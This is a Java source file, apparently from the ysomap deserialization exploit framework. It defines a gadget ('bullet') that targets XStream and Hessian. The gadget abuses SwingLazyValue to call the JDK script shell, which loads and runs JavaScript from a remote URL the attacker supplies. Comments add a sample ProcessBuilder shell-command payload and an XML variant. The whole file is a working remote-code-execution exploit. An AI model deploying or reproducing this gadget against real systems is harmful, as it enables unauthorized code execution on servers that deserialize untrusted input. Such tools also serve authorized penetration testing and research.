package ysomap.bullets.jdk;

import sun.swing.SwingLazyValue;
import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;

/**
 * @author wh1t3P1g
 * @since 2021/1/4
 */
@Bullets
@Dependencies({"jdk"})
@Details("js rce for jdk 17")
@Targets({Targets.XSTREAM, Targets.HESSIAN})
@Authors({Authors.WH1T3P1G})
public class SwingLazyValueWithRemoteJS extends AbstractBullet<SwingLazyValue> {

    @NotNull
    @Require(name = "url", detail = "remote js url, like http://127.0.0.1/1.js")
    public String url;

    @Override
    public SwingLazyValue getObject() throws Exception {
        String classname = "com.sun.tools.script.shell.Main";
        String methodName = "main";
        Object[] evilargs = new Object[]{new String[]{"-e", String.format("load('%s')", url)}};
        return new SwingLazyValue(classname, methodName, evilargs);
    }

    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new SwingLazyValueWithRemoteJS();
        bullet.set("url", args[0]);
        return bullet;
    }

    /* js file example
    new java.lang.ProcessBuilder(["/bin/bash","-c","open -a Calculator.app"]).start();
     */

    // TODO javax.swing.plaf.synth.SynthLookAndFeel.load(java.net.URL) xml rce
    /*
    <new class="java.lang.ProcessBuilder">
     <string>open</string>
     <string>-a</string>
     <string>Calculator</string>
     <object method="start"></object>
    </new>
     */
}
